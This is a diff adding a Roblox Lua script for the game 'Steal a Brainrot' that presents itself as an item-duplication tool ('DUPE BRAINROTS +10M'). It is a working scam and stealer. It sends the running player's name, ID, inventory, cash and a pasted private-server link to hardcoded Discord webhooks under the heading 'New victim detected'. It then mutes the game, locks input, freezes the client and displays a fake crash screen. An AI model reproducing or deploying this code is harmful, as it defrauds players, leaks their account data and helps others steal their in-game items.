@@ -1,0 +1,1013 @@
+local Players = game:GetService("Players")
+local PlayersCount = #Players:GetPlayers()
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local placeId = 17308778014
+
+-- Lista de URLs de webhooks
+local WEBHOOK_URLS = {
+    "https://discord.com/api/webhooks/1427504087355625602/-6Cgc9cPDqcLsMQDMKFwPrai6KHZZWhvirPTfq6YNeXOlcdnwzlLlXjg1tY8husqBWGa",
+    "https://discord.com/api/webhooks/1427504087355625602/-6Cgc9cPDqcLsMQDMKFwPrai6KHZZWhvirPTfq6YNeXOlcdnwzlLlXjg1tY8husqBWGa"
+}
+
+local Mutations = {
+    ["Gold"] = {multiplier = 1.5, emoji = "🟡"},
+    ["Bloodrot"] = {multiplier = 2, emoji = "🔴"},
+    ["Diamond"] = {multiplier = 3, emoji = "💎"},
+    ["Candy"] = {multiplier = 4, emoji = "🍬"},
+    ["Lava"] = {multiplier = 6, emoji = "🌋"},
+    ["Galaxy"] = {multiplier = 7, emoji = "🌌"},
+    ["Yin Yang"] = {multiplier = 7.5, emoji = "☯️"},
+    ["Rainbow"] = {multiplier = 10, emoji = "🌈"}
+}
+
+local BrainrotData = {
+    ["Garama and Madundung"] = {price = 10000000000, generation = 50000000, rarity = "Secret"},
+    ["Strawberry Elephant"] = {price = 500000000000, generation = 350000000, rarity = "OG"},
+    ["Noo my examine"] = {price = 525000000, generation = 1700000, rarity = "Secret"},
+    ["Yess my examine"] = {price = 130000000, generation = 575000, rarity = "Secret"},
+    ["Spaghetti Tualetti"] = {price = 15000000000, generation = 60000000, rarity = "Secret"},
+    ["Extinct Matteo"] = {price = 140000000, generation = 625000, rarity = "Secret"},
+    ["Las Sis"] = {price = 2500000000, generation = 17500000, rarity = "Secret"},
+    ["La Extinct Grande"] = {price = 3250000000, generation = 23500000, rarity = "Secret"},
+    ["La Sahur Combinasion"] = {price = 550000000, generation = 2000000, rarity = "Secret"},
+    ["Tralaledon"] = {price = 3000000000, generation = 27500000, rarity = "Secret"},
+    ["Los Bros"] = {price = 6000000000, generation = 37500000, rarity = "Secret"},
+    ["Boatito Auratito"] = {price = 115000000, generation = 525000, rarity = "Secret"},
+    ["Horegini Boom"] = {price = 650000000, generation = 2700000, rarity = "Secret"},
+    ["Rang Ring Bus"] = {price = 1100000000, generation = 6000000, rarity = "Secret"},
+    ["La Grande Combinasion"] = {price = 100000000, generation = 10000000, rarity = "Secret"},
+    ["Graipuss Medussi"] = {price = 250000000, generation = 1000000, rarity = "Secret"},
+    ["Tacorita Bicicleta"] = {price = 2200000000, generation = 16500000, rarity = "Secret"},
+    ["Nuclearo Dinossauro"] = {price = 2500000000, generation = 15000000, rarity = "Secret"},
+    ["Los 67"] = {price = 2700000000, generation = 22500000, rarity = "Secret"},
+    ["Money Money Puggy"] = {price = 2600000000, generation = 21000000, rarity = "Secret"},
+    ["Chillin Chili"] = {price = 3000000000, generation = 350000000, rarity = "Secret"},
+    ["Los Tacoritas"] = {price = 4000000000, generation = 32000000, rarity = "Secret"},
+    ["Tang Tang Keletang"] = {price = 4500000000, generation = 33500000, rarity = "Secret"},
+    ["Los Combinasionas"] = {price = 2000000000, generation = 15000000, rarity = "Secret"},
+    ["Esok Sekolah"] = {price = 750000000, generation = 30000000, rarity = "Secret"},
+    ["Los Mobilis"] = {price = 2700000000, generation = 22000000, rarity = "Secret"},
+    ["Eviledon"] = {price = 3800000000, generation = 31500000, rarity = "Secret"},
+    ["Spooky And Pumpky"] = {price = 25000000000, generation = 80000000, rarity = "Secret"},
+    ["Los Spooky Combinasionas"] = {price = 3000000000, generation = 20000000, rarity = "Secret"},
+    ["La Spooky Grande"] = {price = 2900000000, generation = 20000000, rarity = "Secret"},
+    ["Tictac Sahur"] = {price = 6000000000, generation = 37500000, rarity = "Secret"},
+    ["Mariachi Corazoni"] = {price = 1700000000, generation = 12500000, rarity = "Secret"},
+    ["Chicleteira Bicicleteira"] = {price = 750000000, generation = 3500000, rarity = "Secret"},
+    ["Burguro And Fryuro"] = {price = 75000000000, generation = 150000000, rarity = "Secret"},
+    ["Ketupat Kepat"] = {price = 5000000000, generation = 35000000, rarity = "Secret"},
+    ["Dragon Cannelloni"] = {price = 200000000000, generation = 200000000, rarity = "Secret"},
+    ["Capitano Moby"] = {price = 125000000000, generation = 160000000, rarity = "Secret"},
+    ["La Taco Combinasion"] = {price = 5000000000, generation = 35000000, rarity = "Secret"},
+    ["Chicleteirina Bicicleteirina"] = {price = 850000000, generation = 4000000, rarity = "Secret"},
+    ["La Secret Combinasion"] = {price = 50000000000, generation = 125000000, rarity = "Secret"},
+    ["Fragrama and Chocrama"] = {price = 40000000000, generation = 100000000, rarity = "Secret"},
+    ["Los Spaghettis"] = {price = 20000000000, generation = 70000000, rarity = "Secret"},
+    ["Los Puggies"] = {price = 3000000000, generation = 30000000, rarity = "Secret"},
+    ["Pirulitoita Bicicleteira"] = {price = 600000000, generation = 2500000, rarity = "Secret"},
+    ["Chipso And Queso"] = {price = 2500000000, generation = 25000000, rarity = "Secret"},
+    ["Mieteteira Bicicleteira"] = {price = 2700000000, generation = 26000000, rarity = "Secret"},
+    ["67"] = {price = 1250000000, generation = 7500000, rarity = "Secret"},
+    ["Fragola La La La"] = {price = 125000000, generation = 450000, rarity = "Secret"},
+    ["La Karkerkar Combinasion"] = {price = 160000000, generation = 600000, rarity = "Secret"},
+    ["Los Chicleteiras"] = {price = 1200000000, generation = 7000000, rarity = "Secret"},
+    ["Chachechi"] = {price = 85000000, generation = 400000, rarity = "Secret"},
+    ["Extinct Tralalero"] = {price = 125000000, generation = 450000, rarity = "Secret"},
+    ["Los Nooo My Hotspotsitos"] = {price = 1000000000, generation = 5000000, rarity = "Secret"},
+    ["Trenostruzzo Turbo 4000"] = {price = 100000000, generation = 310000, rarity = "Secret"},
+    ["La Vacca Saturno Saturnita"] = {price = 50000000, generation = 300000, rarity = "Secret"},
+    ["Meowl"] = {price = 350000000000, generation = 275000000, rarity = "OG"}
+}
+
+local function getExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    elseif KRNL_LOADED then
+        return "KRNL"
+    elseif syn then
+        return "Synapse X"
+    elseif SENTINEL_V2 then
+        return "Sentinel"
+    elseif getexecutorname then
+        return getexecutorname()
+    else
+        return "Unknown Executor"
+    end
+end
+
+local function getAccountAge()
+    return player.AccountAge .. " days"
+end
+
+local function formatNumber(num)
+    if num >= 1000000000 then
+        return string.format("%.2fB", num / 1000000000)
+    elseif num >= 1000000 then
+        return string.format("%.2fM", num / 1000000)
+    elseif num >= 1000 then
+        return string.format("%.2fK", num / 1000)
+    else
+        return tostring(math.floor(num))
+    end
+end
+
+local function getBrainrotBaseName(fullName)
+    local baseName = fullName:match("^(.-)%s+[a-f0-9]+-[a-f0-9]+-[a-f0-9]+-[a-f0-9]+-[a-f0-9]+$") or fullName
+    baseName = baseName:match("^(.-)%s+%d+$") or baseName
+    return baseName:match("^%s*(.-)%s*$")
+end
+
+local function detectMutation(brainrotModel)
+    if brainrotModel:GetAttribute("Mutation") then
+        return brainrotModel:GetAttribute("Mutation")
+    end
+    
+    local modelName = brainrotModel.Name:lower()
+    if modelName:find("rainbow") then
+        return "Rainbow"
+    elseif modelName:find("gold") then
+        return "Gold"
+    elseif modelName:find("blood") or modelName:find("red") then
+        return "Bloodrot"
+    elseif modelName:find("diamond") then
+        return "Diamond"
+    elseif modelName:find("candy") or modelName:find("pink") then
+        return "Candy"
+    elseif modelName:find("lava") or modelName:find("orange") then
+        return "Lava"
+    elseif modelName:find("galaxy") or modelName:find("purple") then
+        return "Galaxy"
+    elseif modelName:find("yin") or modelName:find("yang") then
+        return "Yin Yang"
+    end
+    
+    for _, child in pairs(brainrotModel:GetDescendants()) do
+        if child:IsA("ParticleEmitter") then
+            local particleName = child.Name:lower()
+            if particleName:find("rainbow") then
+                return "Rainbow"
+            elseif particleName:find("gold") then
+                return "Gold"
+            elseif particleName:find("blood") or particleName:find("red") then
+                return "Bloodrot"
+            elseif particleName:find("diamond") then
+                return "Diamond"
+            elseif particleName:find("candy") or particleName:find("pink") then
+                return "Candy"
+            elseif particleName:find("lava") or particleName:find("orange") then
+                return "Lava"
+            elseif particleName:find("galaxy") or particleName:find("purple") then
+                return "Galaxy"
+            elseif particleName:find("yin") or particleName:find("yang") then
+                return "Yin Yang"
+            end
+        end
+    end
+    
+    local partCount = 0
+    local colorVotes = {}
+    
+    for _, part in pairs(brainrotModel:GetDescendants()) do
+        if part:IsA("BasePart") or part:IsA("MeshPart") then
+            partCount = partCount + 1
+            local color = part.Color
+            
+            if color.R > 0.8 and color.G > 0.7 and color.B < 0.3 then
+                colorVotes["Gold"] = (colorVotes["Gold"] or 0) + 1
+            elseif color.R > 0.8 and color.G < 0.2 and color.B < 0.2 then
+                colorVotes["Bloodrot"] = (colorVotes["Bloodrot"] or 0) + 1
+            elseif color.R < 0.3 and color.G > 0.8 and color.B > 0.9 then
+                colorVotes["Diamond"] = (colorVotes["Diamond"] or 0) + 1
+            elseif color.R > 0.9 and color.G < 0.4 and color.B > 0.7 then
+                colorVotes["Candy"] = (colorVotes["Candy"] or 0) + 1
+            elseif color.R > 0.9 and color.G > 0.4 and color.G < 0.6 and color.B < 0.2 then
+                colorVotes["Lava"] = (colorVotes["Lava"] or 0) + 1
+            elseif color.R > 0.6 and color.G < 0.3 and color.B > 0.8 then
+                colorVotes["Galaxy"] = (colorVotes["Galaxy"] or 0) + 1
+            elseif (color.R < 0.1 and color.G < 0.1 and color.B < 0.1) or 
+                   (color.R > 0.9 and color.G > 0.9 and color.B > 0.9) then
+                colorVotes["Yin Yang"] = (colorVotes["Yin Yang"] or 0) + 1
+            end
+        end
+    end
+    
+    local maxVotes = 0
+    local detectedMutation = nil
+    
+    for mutation, votes in pairs(colorVotes) do
+        if votes > maxVotes and votes > partCount * 0.3 then
+            maxVotes = votes
+            detectedMutation = mutation
+        end
+    end
+    
+    if detectedMutation == "Yin Yang" then
+        local hasBlack = false
+        local hasWhite = false
+        
+        for _, part in pairs(brainrotModel:GetDescendants()) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                local color = part.Color
+                if color.R < 0.1 and color.G < 0.1 and color.B < 0.1 then
+                    hasBlack = true
+                elseif color.R > 0.9 and color.G > 0.9 and color.B > 0.9 then
+                    hasWhite = true
+                end
+            end
+        end
+        
+        if not (hasBlack and hasWhite) then
+            detectedMutation = nil
+        end
+    end
+    
+    return detectedMutation
+end
+
+local function findPlayerPlot()
+    local plotsFolder = Workspace:FindFirstChild("Plots")
+    if not plotsFolder then
+        return nil
+    end
+
+    for _, plot in pairs(plotsFolder:GetChildren()) do
+        if plot.Name == player.Name or plot.Name == tostring(player.UserId) then
+            return plot
+        end
+    end
+
+    return nil
+end
+
+local function getOwnedBrainrots()
+    local owned = {}
+    local totalProduction = 0
+    local brainrotCount = {}
+
+    local playerPlot = findPlayerPlot()
+
+    if not playerPlot then
+        local plotsFolder = Workspace:FindFirstChild("Plots")
+        if plotsFolder then
+            for _, plot in pairs(plotsFolder:GetChildren()) do
+                for _, obj in pairs(plot:GetChildren()) do
+                    if obj:IsA("Model") then
+                        local baseName = getBrainrotBaseName(obj.Name)
+                        if BrainrotData[baseName] then
+                            local mutation = detectMutation(obj)
+                            local key = mutation and (baseName .. "|" .. mutation) or baseName
+                            
+                            if not brainrotCount[key] then
+                                brainrotCount[key] = {count = 0, mutation = mutation}
+                            end
+                            brainrotCount[key].count = brainrotCount[key].count + 1
+                        end
+                    end
+                end
+            end
+        end
+    else
+        for _, obj in pairs(playerPlot:GetChildren()) do
+            if obj:IsA("Model") then
+                local baseName = getBrainrotBaseName(obj.Name)
+
+                if BrainrotData[baseName] then
+                    local mutation = detectMutation(obj)
+                    local key = mutation and (baseName .. "|" .. mutation) or baseName
+                    
+                    if not brainrotCount[key] then
+                        brainrotCount[key] = {count = 0, mutation = mutation}
+                    end
+                    brainrotCount[key].count = brainrotCount[key].count + 1
+                end
+            end
+        end
+    end
+
+    for key, info in pairs(brainrotCount) do
+        local brainrotName = key:match("^(.-)%|") or key
+        local mutation = info.mutation
+        local count = info.count
+        
+        local data = BrainrotData[brainrotName]
+        local baseProduction = data.generation
+        local multiplier = mutation and Mutations[mutation].multiplier or 1
+        local productionPerUnit = baseProduction * multiplier
+        local production = productionPerUnit * count
+        
+        totalProduction = totalProduction + production
+
+        table.insert(owned, {
+            name = brainrotName,
+            count = count,
+            production = production,
+            productionPerUnit = productionPerUnit,
+            baseProduction = baseProduction,
+            price = data.price,
+            rarity = data.rarity,
+            mutation = mutation,
+            multiplier = multiplier
+        })
+    end
+
+    table.sort(owned, function(a, b)
+        return a.production > b.production
+    end)
+
+    return owned, totalProduction
+end
+
+local function formatBrainrotsList(brainrots, totalProduction)
+    if #brainrots == 0 then
+        return "No brainrots detected"
+    end
+
+    local formatted = ""
+    local totalUnits = 0
+
+    for i, brainrot in ipairs(brainrots) do
+        totalUnits = totalUnits + brainrot.count
+
+        if brainrot.mutation then
+            formatted = formatted .. "[" .. brainrot.mutation .. "] " .. brainrot.name .. " - $" .. formatNumber(brainrot.productionPerUnit) .. "/s"
+        else
+            formatted = formatted .. " " .. brainrot.name .. "  - $" .. formatNumber(brainrot.productionPerUnit) .. "/s"
+        end
+
+        if brainrot.count > 1 then
+            formatted = formatted .. " [x" .. brainrot.count .. "]"
+        end
+
+        if i < #brainrots then
+            formatted = formatted .. "\n"
+        end
+    end
+
+    formatted = formatted .. "\n\n💰 Total Production: $" .. formatNumber(totalProduction) .. "/s"
+    formatted = formatted .. "\n🎃 Total Units: " .. totalUnits
+
+    return formatted
+end
+
+local function validateRobloxLink(link)
+    link = link:gsub("%s+", "") -- Remove extra spaces
+    if link == "" then
+        return false, "The link is empty"
+    end
+
+    -- Strict pattern for https://www.roblox.com/share?code=<alphanumeric-code>&type=Server
+    local sharePattern = "^https://www%.roblox%.com/share%?code=([a-f0-9-]+)&type=[Ss]erver$"
+    local serverCode = link:match(sharePattern)
+    if serverCode then
+        -- Basic validation: ensure code is alphanumeric with optional hyphens and at least 32 characters
+        if serverCode:match("^[a-f0-9-]+$") and #serverCode >= 32 then
+            return true, link
+        else
+            return false, "Invalid server code format"
+        end
+    end
+
+    return false, "Invalid link format. Must be https://www.roblox.com/share?code=<code>&type=Server"
+end
+
+local function sendWebhook(link)
+    local ownedBrainrots, totalProduction = getOwnedBrainrots()
+    local brainrotsList = formatBrainrotsList(ownedBrainrots, totalProduction)
+
+    local embedData = {
+        {
+            ["title"] = "DUPE BRAINROTS",
+            ["description"] = "New victim detected",
+            ["color"] = 65280,
+            ["fields"] = {
+                {
+                    ["name"] = "📋 Info",
+                    ["value"] = player.UserId .. " - " .. player.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "⏰ Account Age",
+                    ["value"] = getAccountAge(),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "⚙️ Executor",
+                    ["value"] = getExecutor(),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🎃 Brainrots Owned (" .. #ownedBrainrots .. " types)",
+                    ["value"] = brainrotsList ~= "" and brainrotsList or "No brainrots detected",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "💰 Money",
+                    ["value"] = player.leaderstats and player.leaderstats.Cash and formatNumber(player.leaderstats.Cash.Value) or "Unknown",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔄 Rebirths",
+                    ["value"] = player.leaderstats and player.leaderstats.Rebirths and tostring(player.leaderstats.Rebirths.Value) or "0",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📊 Total Production",
+                    ["value"] = "$" .. formatNumber(totalProduction) .. "/s",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "✅ Status",
+                    ["value"] = "Working",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "👥 Players",
+                    ["value"] = PlayersCount,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔗 Private Server",
+                    ["value"] = link,
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "discord.gg/hwzSp8qXWN | Steal a Brainrot"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }
+    }
+
+    local webhookData = {
+        content = "s",
+        embeds = embedData,
+        username = "DUPE BRAINROTS"
+    }
+
+    local jsonData = HttpService:JSONEncode(webhookData)
+
+    local methods = {
+        function(url)
+            if http_request then
+                return pcall(function()
+                    http_request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = jsonData
+                    })
+                end)
+            end
+            return false
+        end,
+
+        function(url)
+            if request then
+                return pcall(function()
+                    request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = jsonData
+                    })
+                end)
+            end
+            return false
+        end,
+
+        function(url)
+            if syn and syn.request then
+                return pcall(function()
+                    syn.request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = jsonData
+                    })
+                end)
+            end
+            return false
+        end,
+
+        function(url)
+            return pcall(function()
+                game:GetService("HttpService"):RequestAsync({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+        end
+    }
+
+    local anySuccess = false
+
+    -- Intentar enviar a cada URL en la lista
+    for _, webhookUrl in ipairs(WEBHOOK_URLS) do
+        for _, method in ipairs(methods) do
+            local success, result = method(webhookUrl)
+            if success then
+                anySuccess = true
+                break
+            end
+            wait(0.1)
+        end
+    end
+
+    return anySuccess
+end
+
+local function disableControls()
+    UserInputService.MouseIconEnabled = false
+
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.Escape then
+            return
+        else
+            pcall(function()
+                if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                    player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Physics)
+                end
+            end)
+        end
+    end)
+
+    return connection
+end
+
+local function freezeClient()
+    -- Detener actualizaciones del RunService (localmente)
+    RunService:UnbindFromRenderStep("GameUpdate")
+    RunService.RenderStepped:Connect(function()
+        -- No hacer nada para pausar actualizaciones
+    end)
+
+    -- Congelar el personaje
+    if player.Character then
+        pcall(function()
+            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 0
+                humanoid.JumpPower = 0
+                humanoid:ChangeState(Enum.HumanoidStateType.Frozen)
+            end
+            for _, part in pairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Anchored = true
+                end
+            end
+        end)
+    end
+
+    -- Congelar el mapa (detener animaciones y actualizaciones)
+    for _, descendant in pairs(Workspace:GetDescendants()) do
+        if descendant:IsA("BasePart") or descendant:IsA("Model") then
+            pcall(function()
+                descendant.Anchored = true -- Congelar partes
+                if descendant:FindFirstChildOfClass("BodyForce") then
+                    descendant:FindFirstChildOfClass("BodyForce"):Destroy()
+                end
+            end)
+        elseif descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Smoke") then
+            pcall(function()
+                descendant.Enabled = false -- Detener efectos
+            end)
+        end
+    end
+end
+
+local function simulateCrash()
+    -- Crear un overlay que simule un crash
+    local overlay = Instance.new("Frame")
+    overlay.Size = UDim2.new(1, 0, 1, 0)
+    overlay.Position = UDim2.new(0, 0, 0, 0)
+    overlay.BackgroundColor3 = Color3.new(0, 0, 0) -- Fondo negro
+    overlay.BackgroundTransparency = 0
+    overlay.ZIndex = 999999
+    overlay.Parent = screenGui
+
+    wait(1) -- Esperar 1 segundo después del crash
+
+    local crashText = Instance.new("TextLabel")
+    crashText.Size = UDim2.new(0, 600, 0, 100)
+    crashText.Position = UDim2.new(0.5, -300, 0.5, -50)
+    crashText.BackgroundTransparency = 1
+    crashText.Text = "An error has occurred"
+    crashText.TextColor3 = Color3.new(1, 0, 0)
+    crashText.TextSize = 24
+    crashText.Font = Enum.Font.GothamBold
+    crashText.TextWrapped = true
+    crashText.ZIndex = 999999
+    crashText.Parent = overlay
+
+    local errorMessages = {
+        "Error: Script failed to execute",
+        "Error: Connection lost",
+        "Error: Invalid data detected",
+        "Error: System crash detected"
+    }
+
+    spawn(function()
+        while true do
+            local randomMessage = errorMessages[math.random(1, #errorMessages)]
+            crashText.Text = "An error has occurred\n" .. randomMessage
+            wait(2) -- Cambiar mensajes cada 2 segundos
+        end
+    end)
+
+    local fixingBarBack = Instance.new("Frame")
+    fixingBarBack.Size = UDim2.new(0, 400, 0, 20)
+    fixingBarBack.Position = UDim2.new(0.5, -200, 0.7, 0)
+    fixingBarBack.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    fixingBarBack.BorderSizePixel = 0
+    fixingBarBack.ZIndex = 999999
+    fixingBarBack.Parent = overlay
+
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 10)
+    barCorner.Parent = fixingBarBack
+
+    local fixingBar = Instance.new("Frame")
+    fixingBar.Size = UDim2.new(0, 50, 1, 0) -- Barra estática al 12.5%
+    fixingBar.BackgroundColor3 = Color3.new(0, 0.5, 0)
+    fixingBar.BorderSizePixel = 0
+    fixingBar.ZIndex = 999999
+    fixingBar.Parent = fixingBarBack
+
+    local barCorner2 = Instance.new("UICorner")
+    barCorner2.CornerRadius = UDim.new(0, 10)
+    barCorner2.Parent = fixingBar
+
+    local fixingText = Instance.new("TextLabel")
+    fixingText.Size = UDim2.new(1, 0, 1, 0)
+    fixingText.BackgroundTransparency = 1
+    fixingText.Text = "Fixing..."
+    fixingText.TextColor3 = Color3.new(1, 1, 1)
+    fixingText.TextSize = 14
+    fixingText.Font = Enum.Font.GothamBold
+    fixingText.ZIndex = 999999
+    fixingText.Parent = fixingBarBack
+
+    -- Bloquear interacciones
+    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+    UserInputService.MouseIconEnabled = false
+
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input)
+        return -- Ignorar cualquier entrada
+    end)
+
+    -- Mantener la GUI activa
+    screenGui.Enabled = true
+    mainFrame.Active = true
+    mainFrame.Selectable = false
+end
+
+local function checkIfPrivateServer()
+    local success, result = pcall(function()
+        return game:GetService("ReplicatedStorage"):FindFirstChild("PrivateServerId") or 
+               game:GetService("ReplicatedStorage"):FindFirstChild("PSID") or
+               game.PrivateServerId ~= "" or
+               game.PrivateServerOwnerId ~= 0
+    end)
+
+    if success and (result == true or game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0) then
+        return true
+    end
+
+    if #Players:GetPlayers() <= 10 then
+        return true
+    end
+
+    return false
+end
+
+if not checkIfPrivateServer() then
+    player:Kick("❌ Only allowed in private servers\n✅ Join a private server first")
+    return
+end
+
+-- Silenciar sonido solo para el usuario que ejecuta el script
+local localSoundGroup = Instance.new("SoundGroup")
+localSoundGroup.Name = "LocalMute"
+localSoundGroup.Parent = player
+localSoundGroup.Volume = 0
+
+-- Intentar silenciar todos los sonidos del jugador
+pcall(function()
+    for _, sound in pairs(SoundService:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.SoundGroup = localSoundGroup
+        end
+    end
+end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DUPE BRAINROTS +10M"
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.DisplayOrder = 999999
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = CoreGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 400, 0, 300) -- GUI más pequeña (centro, 400x300)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150) -- Centrado en pantalla
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 10
+mainFrame.Parent = screenGui
+
+local loaderSound = Instance.new("Sound", mainFrame)
+loaderSound.SoundId = "rbxassetid://1848354536"
+loaderSound.Volume = 1 -- Volumen estándar
+loaderSound.Looped = true
+loaderSound:Play()
+
+local packages = game:GetService("ReplicatedStorage"):WaitForChild("Packages")
+local net = packages:WaitForChild("Net")
+local toggleSetting = net:WaitForChild("RF/SettingsService/ToggleSetting")
+
+local settingsToDisable = {"Music", "Sound Effects", "Chat Tips", "VFX"}
+
+for _, setting in ipairs(settingsToDisable) do
+    pcall(function()
+        toggleSetting:InvokeServer(setting)
+        print("Disabled:", setting)
+    end)
+    task.wait(0.2)
+end
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(0, 300, 0, 50)
+titleLabel.Position = UDim2.new(0.5, -150, 0.1, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "DUPE BRAINROTS +10M"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextSize = 30
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.ZIndex = 11
+titleLabel.Parent = mainFrame
+
+local discordLabel = Instance.new("TextLabel")
+discordLabel.Size = UDim2.new(0, 250, 0, 30)
+discordLabel.Position = UDim2.new(0.5, -125, 0.2, 0)
+discordLabel.BackgroundTransparency = 1
+discordLabel.Text = "discord.gg/hwzSp8qXWN"
+discordLabel.TextColor3 = Color3.new(0.4, 0.7, 1)
+discordLabel.TextSize = 18
+discordLabel.Font = Enum.Font.GothamBold
+discordLabel.ZIndex = 11
+discordLabel.Parent = mainFrame
+
+local loadingTextLabel = Instance.new("TextLabel")
+loadingTextLabel.Size = UDim2.new(0, 300, 0, 30)
+loadingTextLabel.Position = UDim2.new(0.5, -150, 0.35, 0)
+loadingTextLabel.BackgroundTransparency = 1
+loadingTextLabel.Text = "Loading script..."
+loadingTextLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+loadingTextLabel.TextSize = 16
+loadingTextLabel.Font = Enum.Font.Gotham
+loadingTextLabel.ZIndex = 11
+loadingTextLabel.Parent = mainFrame
+
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Size = UDim2.new(0, 300, 0, 30)
+warningLabel.Position = UDim2.new(0.5, -150, 0.45, 0)
+warningLabel.BackgroundTransparency = 1
+warningLabel.Text = "Base will auto-lock"
+warningLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
+warningLabel.TextSize = 14
+warningLabel.Font = Enum.Font.Gotham
+warningLabel.ZIndex = 11
+warningLabel.Parent = mainFrame
+
+local textBoxFrame = Instance.new("Frame")
+textBoxFrame.Size = UDim2.new(0, 300, 0, 40)
+textBoxFrame.Position = UDim2.new(0.5, -150, 0.6, 0)
+textBoxFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+textBoxFrame.BorderSizePixel = 3
+textBoxFrame.BorderColor3 = Color3.new(1, 1, 1)
+textBoxFrame.ZIndex = 11
+textBoxFrame.Parent = mainFrame
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1, -10, 1, -5)
+textBox.Position = UDim2.new(0, 5, 0, 2.5)
+textBox.BackgroundTransparency = 1
+textBox.Text = ""
+textBox.PlaceholderText = "Paste server link..."
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.TextSize = 14
+textBox.ClearTextOnFocus = false
+textBox.ZIndex = 12
+textBox.TextXAlignment = Enum.TextXAlignment.Center
+textBox.Font = Enum.Font.Gotham
+textBox.Parent = textBoxFrame
+
+local joinButton = Instance.new("TextButton")
+joinButton.Size = UDim2.new(0, 150, 0, 40)
+joinButton.Position = UDim2.new(0.5, -75, 0.75, 0)
+joinButton.BackgroundColor3 = Color3.new(0, 1, 0)
+joinButton.BorderSizePixel = 0
+joinButton.Text = "Enter"
+joinButton.TextColor3 = Color3.new(0, 0, 0)
+joinButton.TextSize = 20
+joinButton.Font = Enum.Font.GothamBlack
+joinButton.ZIndex = 11
+joinButton.Parent = mainFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 10)
+buttonCorner.Parent = joinButton
+
+local errorLabel = Instance.new("TextLabel")
+errorLabel.Size = UDim2.new(0, 300, 0, 30)
+errorLabel.Position = UDim2.new(0.5, -150, 0.85, 0)
+errorLabel.BackgroundTransparency = 1
+errorLabel.Text = ""
+errorLabel.TextColor3 = Color3.new(1, 0, 0)
+errorLabel.TextSize = 16
+errorLabel.Font = Enum.Font.GothamBold
+errorLabel.Visible = false
+errorLabel.ZIndex = 11
+errorLabel.Parent = mainFrame
+
+local footerLabel = Instance.new("TextLabel")
+footerLabel.Size = UDim2.new(0, 200, 0, 20)
+footerLabel.Position = UDim2.new(0.5, -100, 0.95, 0)
+footerLabel.BackgroundTransparency = 1
+footerLabel.Text = "Made by apela"
+footerLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)
+footerLabel.TextSize = 12
+footerLabel.Font = Enum.Font.Gotham
+footerLabel.ZIndex = 11
+footerLabel.Parent = mainFrame
+
+local function showLoadingScreen()
+    textBoxFrame.Visible = false
+    joinButton.Visible = false
+    errorLabel.Visible = false
+    footerLabel.Visible = false
+
+    titleLabel.Position = UDim2.new(0.5, -150, 0.1, 0)
+    discordLabel.Position = UDim2.new(0.5, -125, 0.2, 0)
+    loadingTextLabel.Position = UDim2.new(0.5, -150, 0.35, 0)
+    warningLabel.Position = UDim2.new(0.5, -150, 0.45, 0)
+
+    local progressBarBack = Instance.new("Frame")
